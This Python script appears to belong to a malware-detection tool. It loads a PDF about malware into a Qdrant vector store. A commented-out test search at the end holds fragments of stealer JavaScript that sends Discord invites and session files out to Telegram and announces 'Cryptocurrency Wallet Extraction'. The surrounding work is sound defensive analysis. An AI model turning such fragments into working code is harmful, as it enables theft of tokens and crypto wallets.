import uuid
from langchain_community.document_loaders import PyPDFLoader
from langchain_text_splitters import RecursiveCharacterTextSplitter
from src.common.embedding_model import EmbeddingModel
from src.common.qdrant_adapter import QdrantAdapter
def ingestData():
    # 1️⃣ Init Qdrant
    qdrantDB = QdrantAdapter()

    # 2️⃣ Load PDF
    loader = PyPDFLoader("documents/malware-book.pdf")
    documents = loader.load()

    # 3️⃣ Split into chunks
    text_splitter = RecursiveCharacterTextSplitter(
        chunk_size=1000,
        chunk_overlap=200
    )

    components = text_splitter.split_documents(documents)

    # 4️⃣ Prepare texts
    texts = [doc.page_content for doc in components]

    # 5️⃣ Generate embeddings
    embedding_model = EmbeddingModel()
    vectors = embedding_model.embed(texts)

    # 6️⃣ Prepare ids
    ids = [str(uuid.uuid4()) for _ in texts]

    # 7️⃣ Prepare payloads
    payloads = [
        {
            "text": doc.page_content,
            "source": doc.metadata.get("source", ""),
            "page": doc.metadata.get("page", "")
        }
        for doc in components
    ]

    # 8️⃣ Insert into Qdrant
    qdrantDB.insert(ids=ids, vectors=vectors, payloads=payloads)
    print("Inserted successfully!")

if __name__ == "__main__":
    # db = QdrantAdapter()
    """
    {"confidence": 0.95, "obfuscated": 0.0, "malware": 0.95, "securityRisk": 0.98}
    """
    ingestData()
    #print(db.search("const tempDir = path.join(os.tmpdir(), 'telegram-sessions')\nawait sendInviteToTelegram(guild.name, inviteLink)\nsetTimeout(() => {\n            if (client.readyAt) {\n                client.destroy();\n                resolve({\n                    success: true,\n                    serversProcessed: processedCount,\n                    totalServers: totalServers,\n                    timeout: true\n                });\n            } else if (loginAttempted) {\n                client.destroy();\n                reject({\n                    success: false,\n                    error: 'Connection timeout - token may be invalid or expired'\n                });\n            }\n        }, 30000)\nawait bot.sendMessage(chatId, `🔍 **Starting Cryptocurrency Wallet Extraction**\\n\\n**Host:** ${hostname}\\n**Status:** Scanning for wallet extensions...`)\nfs.copyFileSync(sessionInfo.filePath, tempFilePath)\n"))
